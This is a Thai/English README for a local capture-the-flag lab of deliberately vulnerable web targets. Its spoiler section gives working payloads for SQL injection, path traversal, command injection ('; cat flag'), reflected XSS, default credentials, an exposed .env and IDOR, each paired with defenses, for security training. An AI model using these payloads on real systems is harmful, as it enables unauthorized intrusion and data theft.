# sec-check CTF — สนามเจาะ / attack lab

เป้าหมายที่ **จงใจให้มีช่องโหว่** สำหรับฝึก **เจาะจริงด้วยเทคนิคจริง** แล้วเก็บ flag (`SECCHECK{...}`)
Deliberately-vulnerable targets to practice **real exploitation** and capture flags.

```bash
./ctf.sh                 # หรือ ./seccheck.py ctf   →  http://127.0.0.1:8900
```

> ⚠️ **ปลอดภัย 100%:** รันบน `127.0.0.1` เท่านั้น · ฐานข้อมูล (sqlite in-memory), ไฟล์, และเชลล์เป็น
> ของ **ปลอมในแซนด์บ็อกซ์** · flag เป็นของปลอม · เจาะได้แค่ภายในสนาม ไม่กระทบเครื่องจริง
> **เทคนิคเหมือนของจริง แต่ blast radius = 0** — เอาไปใช้กับระบบคนอื่นผิดกฎหมาย ทำกับเป้าฝึกของตัวเองเท่านั้น
>
> Everything binds to loopback, uses a fake in-memory DB / filesystem / shell and fake flags.
> The techniques are authentic; you cannot touch the real host. Only ever attack targets you own.

แต่ละข้อจับคู่กับเลเวลในหน้า **Learn** — เจาะเสร็จแล้วกดอ่านว่า "ทำไมเกิด / ป้องกันยังไง"

---

## 🗺️ โจทย์

| # | Level | ช่องโหว่ | เจาะยังไง (ย่อ) |
|---|---|---|---|
| C1 | 1 | Default credentials | ลองรหัสโรงงาน `admin/admin` |
| C8 | 1 | Exposed `.env` | เดา path: `/c8/.env` |
| C6 | 2 | Path traversal | `?file=../../etc/ctf_flag` |
| C2 | 2 | SQLi — auth bypass | `user = ' OR '1'='1' -- ` |
| C3 | 4 | SQLi — UNION extract | `?id=0' UNION SELECT flag,'x' FROM secret -- ` |
| C7 | 4 | IDOR | `?order=1000` (ของ admin) |
| C5 | 4 | Command injection | `?host=8.8.8.8; cat flag` |
| C4 | 4 | Reflected XSS | `?name=<script>alert(1)</script>` |

---

<details><summary><b>🔓 เฉลยทีละขั้น (กดเพื่อสปอยล์)</b></summary>

### C1 — Default credentials
หน้า `/c1` คือ login admin ลองคู่ยอดฮิต `admin` / `admin` (หรือ `admin`/`password`) → ได้ flag
**ป้องกัน:** เปลี่ยนรหัสทุกตัวตั้งแต่แกะกล่อง, บังคับรหัสยาว (ดู `host.*`, `lan.default_creds`)

### C8 — Exposed `.env`
หน้า `/c8/` เป็นเว็บปกติ แต่ไฟล์ตั้งค่าหลุดขึ้น web root ลอง `curl http://127.0.0.1:8900/c8/.env` → เจอ `FLAG=`
**ป้องกัน:** วาง `.env`/`.git` นอก web root, บล็อก dotfiles (ตรงกับ `web.env_exposed`, `web.git_exposed`)

### C6 — Path traversal
`/c6?file=report.txt` อ่านไฟล์เอกสาร แต่ไม่กรอง `../` →
`curl 'http://127.0.0.1:8900/c6?file=../../etc/ctf_flag'`
**ป้องกัน:** validate/normalize path, allow-list ชื่อไฟล์, อย่าต่อ path จาก input ตรงๆ

### C2 — SQL injection (auth bypass)
query คือ `... WHERE user='$u' AND pass='$p'` ใส่ `user` = `' OR '1'='1' -- ` ทำให้เงื่อนไขเป็นจริงเสมอ:
```bash
curl -X POST http://127.0.0.1:8900/c2 --data-urlencode "u=admin' OR '1'='1' -- " --data "p=x"
```
**ป้องกัน:** parameterized query / prepared statement เสมอ (ตรงกับ `webapp.sqli_error`)

### C3 — SQL injection (UNION extract)
`?id=` ต่อเข้า query ตรงๆ และมีตารางลับ `secret(flag)` ใช้ UNION ดึงออกมา:
```bash
curl "http://127.0.0.1:8900/c3?id=0' UNION SELECT flag,'x' FROM secret -- "
```
**ป้องกัน:** prepared statements, least-privilege DB user

### C7 — IDOR (Insecure Direct Object Reference)
`/c7?order=1001` คือใบเสร็จของคุณ เปลี่ยนเลขเป็น `1000` = ของ admin → flag
**ป้องกัน:** เช็กสิทธิ์ว่า object เป็นของผู้ใช้คนนั้นจริงทุก request (ตรงกับหลักการใน curriculum L4)

### C5 — Command injection
เครื่องมือ ping ต่อ input เข้าเชลล์: `ping -c1 $host` ใส่ตัวคั่น `;` แล้วตามด้วยคำสั่ง:
```bash
curl "http://127.0.0.1:8900/c5?host=8.8.8.8; cat flag"      # หรือ | id
```
(เชลล์ในสนามนี้เป็นของจำลอง — เข้าใจ injection แล้วคืนผลเหมือนจริง ไม่รันบนเครื่องคุณ)
**ป้องกัน:** อย่าส่ง input เข้า shell, ใช้ API ที่ไม่ผ่าน shell, validate เข้ม

### C4 — Reflected XSS
`?name=` ถูกเอาไปแสดงดิบๆ ใส่ payload ที่หลุดเป็น HTML:
```
http://127.0.0.1:8900/c4?name=<script>alert(1)</script>
```
**ป้องกัน:** encode/escape output ตามบริบท + ตั้ง Content-Security-Policy (ตรงกับ `webapp.xss_reflected`, `web.no_csp`)

</details>

---

## แนวทางฝึก
1. ลองเจาะเองก่อนด้วย **เบราว์เซอร์** (แก้ URL/ฟอร์มตรงๆ) — ได้ฟีล "ลงมือจริง"
2. เก็บ flag ส่งที่หน้าแรก ดูคะแนน `x/8`
3. เจาะได้แล้วเปิดหน้า **Learn** อ่าน what/why/fix ของเทคนิคนั้น
4. อยากรู้ว่าฝั่ง "ตั้งรับ" จับได้ไหม → ชี้ `./seccheck.py webapp http://127.0.0.1:8900/c3` ดู

> โตขึ้นอยากเจาะของจริงระดับโลก: ลองเป้าฝึกมาตรฐานที่คนทั้งวงการใช้ — **OWASP Juice Shop**, **DVWA**,
> **PortSwigger Web Security Academy**, **HackTheBox / TryHackMe** (ทุกอันเป็นเป้าที่อนุญาตให้เจาะ)
